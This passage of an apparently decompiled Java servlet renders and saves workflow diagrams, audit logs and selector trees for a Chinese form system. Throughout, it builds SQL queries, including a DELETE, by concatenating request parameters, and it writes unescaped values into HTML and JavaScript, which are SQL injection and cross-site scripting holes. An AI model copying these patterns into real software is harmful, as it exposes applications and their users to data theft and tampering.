        this.out.print("<body style='width:100%;height:100%;overflow:hidden;'><div id='treepanel' style='left:0px;top:0px;position: absolute;z-index:0;width:3000px;height:2000px;background:#fff;' onclick=\"ylt.flow.addNodeByEvent(event)\"></div>");
        TableEx tableEx = null;
        try {
            if (strVerSion == null) {
                strVerSion = "";
            }
            tableEx = new TableEx("*", "t_sys_flow_node", "S_FLOW_ID='" + _strFlowId + "' and S_AUDIT_VERSION='" + strVerSion + "' order by I_NODE_ID");
            final int iRecordCount = tableEx.getRecordCount();
            this.out.print("<script>var str_Sys_FormId='" + str_Sys_FromId + "';var str_Sys_Ver='" + strVerSion + "';yltFlow.strFlowId='" + _strFlowId + "';yltFlow.init({");
            Object objNodeId = 0;
            final int iColCount = tableEx.getColCount();
            final HashMap hashNoView = new HashMap() {
                {
                    this.put("I_NODE_ID", "");
                    this.put("S_NODE_NAME", "");
                    this.put("S_CHILD_ID", "");
                    this.put("I_X", "");
                    this.put("I_Y", "");
                    this.put("S_START", "");
                    this.put("S_END", "");
                    this.put("I_COLOR_INDEX", "");
                    this.put("I_TYPE", "");
                    this.put("S_AUDIT_VERSION", "");
                }
            };
            String strSplit = "";
            for (int i = 0; i < iRecordCount; ++i) {
                final Record record = tableEx.getRecord(i);
                objNodeId = record.getFieldByName("I_NODE_ID").value;
                final String strNodeName = record.getFieldByName("S_NODE_NAME").value.toString().replaceAll("\n", "\\\\n");
                this.out.print(String.valueOf(strSplit) + "'" + objNodeId + "':{'text':'" + strNodeName + "','child':'" + record.getFieldByName("S_CHILD_ID").value + "',x:" + record.getFieldByName("I_X").value + ",y:" + record.getFieldByName("I_Y").value + ",'start':'" + record.getFieldByName("S_START").value + "','end':'" + record.getFieldByName("S_END").value + "',iIndexColor:" + record.getFieldByName("I_COLOR_INDEX").value + ",type:" + record.getFieldByName("I_TYPE").value);
                for (int j = 1; j < iColCount; ++j) {
                    final FieldEx fieldEx = record.getFieldById(j);
                    if (hashNoView.get(fieldEx.fieldName) == null) {
                        this.out.print("," + fieldEx.fieldName + ":'" + fieldEx.value + "'");
                    }
                }
                this.out.print("}");
                strSplit = ",";
            }
            this.out.print("}," + objNodeId + "," + strAudMsg + ");</script></body></html>");
        }
        catch (Exception e) {
            e.printStackTrace();
            return;
        }
        finally {
            if (tableEx != null) {
                tableEx.close();
            }
        }
        if (tableEx != null) {
            tableEx.close();
        }
    }
    
    private String getAudLog(final String _strFlowId, final String strRunId, final String _serVersion) {
        String vResult = "{";
        TableEx tableEx = null;
        final Hashtable<String, String> hashLog = new Hashtable<String, String>();
        try {
            tableEx = new TableEx("S_NODE_CODE", "t_sys_flow_run", "S_FLOW_ID='" + _strFlowId + "' and S_RUN_ID='" + strRunId + "' and S_AUDIT_VERSION='" + _serVersion + "'");
            int iRecordCount = tableEx.getRecordCount();
            String strSplit = "";
            if (iRecordCount > 0) {
                final Record record = tableEx.getRecord(0);
                vResult = String.valueOf(vResult) + "nodeId:'" + record.getFieldByName("S_NODE_CODE").value + "',audUser:''";
                strSplit = ",";
            }
            tableEx.close();
            tableEx = new TableEx("distinct S_NODE_ID,S_AUD_STAUS", "t_sys_flow_log", "S_FLOW_ID='" + _strFlowId + "' and S_RUN_ID='" + strRunId + "' and S_AUDIT_VERSION='" + _serVersion + "'");
            iRecordCount = tableEx.getRecordCount();
            for (int i = 0; i < iRecordCount; ++i) {
                final Record record = tableEx.getRecord(i);
                vResult = String.valueOf(vResult) + strSplit + "'_" + record.getFieldByName("S_NODE_ID").value + "':'" + record.getFieldByName("S_AUD_STAUS").value + "'";
                strSplit = ",";
            }
        }
        catch (Exception e) {
            e.printStackTrace();
            return String.valueOf(vResult) + "}";
        }
        finally {
            if (tableEx != null) {
                tableEx.close();
            }
        }
        if (tableEx != null) {
            tableEx.close();
        }
        vResult = String.valueOf(vResult) + "}";
        return vResult;
    }
    
    private String getAudLog_bak(final String _strFlowId, final String strRunId) {
        String vResult = "{";
        TableEx tableEx = null;
        final Hashtable<String, String> hashLog = new Hashtable<String, String>();
        
        try {
            tableEx = new TableEx("S_NODE_ID,S_AUD_USER,S_AUD_DATE,S_AUD_STAUS", "t_sys_flow_log", "S_FLOW_ID='" + _strFlowId + "' and S_RUN_ID='" + strRunId + "'");
            for (int iRecordCount = tableEx.getRecordCount(), i = 0; i < iRecordCount; ++i) {
                final Record record = tableEx.getRecord(i);
                final String strNodeId = record.getFieldByName("S_NODE_ID").value.toString();
                String strNodeValue = hashLog.get(strNodeId);
                if (strNodeValue == null) {
                    strNodeValue = "";
                }
                strNodeValue = String.valueOf(strNodeValue) + record.getFieldByName("S_AUD_USER").value.toString() + "\\n" + record.getFieldByName("S_AUD_STAUS").value + "\\n" + record.getFieldByName("S_AUD_DATE").value;
                hashLog.put(strNodeId, strNodeValue);
            }
        }
        catch (Exception e) {
            e.printStackTrace();
        }
        finally {
            if (tableEx != null) {
                tableEx.close();
            }
        }
        
        final Enumeration enuKey = hashLog.keys();
        String strSlit = "";
        while (enuKey.hasMoreElements()) {
            final String strKey = enuKey.nextElement().toString();
            vResult = String.valueOf(vResult) + strSlit + strKey + ":'" + hashLog.get(strKey) + "'";
            strSlit = ",";
        }
        vResult = String.valueOf(vResult) + "}";
        return vResult;
    }
    
    private void saveFlow(final String _strFlowId) {
        final DBFactory dbf = new DBFactory();
        TableEx tableEx = null;
        final String strIds = this.request.getParameter("id");
        final String[] arrStrIds = strIds.split(",");
        final int iIdCount = arrStrIds.length;
        final String[] arrAttrs = this.request.getParameter("attrs").split(",");
        final int iAttrCount = arrAttrs.length;
        final String strVersion = this.request.getParameter("sys_flow_ver");
        try {
            tableEx = new TableEx("t_sys_flow_node");
            for (final String strId : arrStrIds) {
                if (!strId.equals("")) {
                    final Record record = new Record();
                    record.addField(new FieldEx("S_FLOW_ID", _strFlowId));
                    record.addField(new FieldEx("S_AUDIT_VERSION", strVersion));
                    record.addField(new FieldEx("I_NODE_ID", strId));
                    record.addField(new FieldEx("S_NODE_NAME", EString.encoderStr(this.request.getParameter(String.valueOf(strId) + "_text"), "utf-8")));
                    record.addField(new FieldEx("I_X", this.request.getParameter(String.valueOf(strId) + "_x")));
                    record.addField(new FieldEx("I_Y", this.request.getParameter(String.valueOf(strId) + "_y")));
                    record.addField(new FieldEx("I_COLOR_INDEX", this.request.getParameter(String.valueOf(strId) + "_iIndexColor")));
                    record.addField(new FieldEx("I_TYPE", this.request.getParameter(String.valueOf(strId) + "_type")));
                    record.addField(new FieldEx("S_CONDITION", EString.encoderStr(this.request.getParameter(String.valueOf(strId) + "_attrchildcon"), "utf-8")));
                    final String strChild = this.request.getParameter(String.valueOf(strId) + "_child");
                    if (strChild != null) {
                        record.addField(new FieldEx("S_CHILD_ID", strChild));
                        record.addField(new FieldEx("S_START", this.request.getParameter(String.valueOf(strId) + "_start")));
                        record.addField(new FieldEx("S_END", this.request.getParameter(String.valueOf(strId) + "_end")));
                    }
                    for (int k = 0; k < iAttrCount; ++k) {
                        record.addField(new FieldEx(arrAttrs[k], EString.encoderStr(this.request.getParameter(String.valueOf(strId) + "_attr" + arrAttrs[k]), "utf-8")));
                    }
                    tableEx.addRecord(record);
                }
            }
            dbf.sqlExe("delete from t_sys_flow_node where S_FLOW_ID='" + _strFlowId + "' and S_AUDIT_VERSION='" + strVersion + "'", false);
            dbf.solveTable(tableEx, true);
            this.out.print("ok");
        }
        catch (Exception e) {
            e.printStackTrace();
            return;
        }
        finally {
            dbf.close();
            if (tableEx != null) {
                tableEx.close();
            }
        }
        dbf.close();
        if (tableEx != null) {
            tableEx.close();
        }
    }
    
    private void generTree() {
        final String strDataId = this.request.getParameter("sys_dataid");
        final String strNodeId = this.request.getParameter("sys_nodeid");
        final String strNodePid = this.request.getParameter("sys_nodepid");
        final String strNodeNM = this.request.getParameter("sys_nodenm");
        final String strRanderDiv = this.request.getParameter("sys_randerid");
        final String strSelId = this.request.getParameter("sys_selid");
        final String strSelValue = this.request.getParameter("sys_selvalue");
        final YLTree ylTree = new YLTree(strDataId, strNodeId, strNodePid, strNodeNM);
        ylTree.request = this.request;
        if (this.request.getParameter("sys_is_mut") != null) {
            ylTree.bIsMut = true;
            ylTree.setOnCheckClick("yltSelect.clickCheckTree('" + strSelId + "',node);");
        }
        else {
            ylTree.setOnClick("yltSelect.clickTree('" + strSelId + "',node);");
        }
        ylTree.setRootName(strRanderDiv, "\u8bf7\u9009\u62e9");
        ylTree.setValue(strSelValue);
        this.out.println(ylTree);
        if (!ylTree.strCurNames.equals("")) {
            this.out.println("$('" + strSelId + "_viewinput').value='" + ylTree.strCurNames + "';");
            this.out.println("$('" + strSelId + "').text='" + ylTree.strCurNames + "';");
        }
        else {
            this.out.println("$('" + strSelId + "_viewinput').value='\u8bf7\u9009\u62e9';");
            this.out.println("$('" + strSelId + "').text='\u8bf7\u9009\u62e9';");
        }
        this.out.println(ylTree.sbValueTextKey);
        this.out.println("$('" + strSelId + "').keyValueText=objTextValueKey;");
    }
    
    private void generDicOption() {
        final Dic dic = new Dic();
        final String strDicType = this.request.getParameter("sys_dictype");
        TableEx tbl = null;
        try {
            tbl = dic.getTypDic(strDicType);
            final int iDicSize = tbl.getRecordCount();
            final String strSelected = "";
            final String strSelectId = this.request.getParameter("selid");
            String arrStrText = "arrStrText=new Array(";
            String arrStrCode = "arrStrCode=new Array(";
            for (int k = 0; k < iDicSize; ++k) {
                final Record dicRecord = tbl.getRecord(k);
                final String strDicValue = dicRecord.getFieldByName("SDICID").value.toString();
                final Object objDicName = dicRecord.getFieldByName("SDICNAME").value;
                if (k == 0) {
                    arrStrText = String.valueOf(arrStrText) + "\"" + objDicName + "\"";
                    arrStrCode = String.valueOf(arrStrCode) + "\"" + strDicValue + "\"";
                }
                else {
                    arrStrText = String.valueOf(arrStrText) + ",\"" + objDicName + "\"";
                    arrStrCode = String.valueOf(arrStrCode) + ",\"" + strDicValue + "\"";
                }
            }
            this.out.println(String.valueOf(arrStrText) + ");" + arrStrCode + ");");
        }
        catch (Exception e) {
            e.printStackTrace();
            return;
        }
        finally {
            if (tbl != null) {
                tbl.close();
            }
        }
        if (tbl != null) {
            tbl.close();
        }
    }
    
    public static void main(final String[] args) {
        String _strItemId = "td1$6";
        _strItemId = _strItemId.replaceAll("\\$", "\\\\\\$");
        System.out.println("excelModOut(this);' id='td1$6'>\u90e8\u95e8</td><td style='border-top:1px solid</td></td> ".replaceAll("id='" + _strItemId + "'>\u90e8\u95e8</td>", "id='" + _strItemId + "'><input type='text'></td>"));
    }
    
    public void doPost(final HttpServletRequest request, final HttpServletResponse response) throws ServletException, IOException {
        this.doGet(request, response);
    }
}
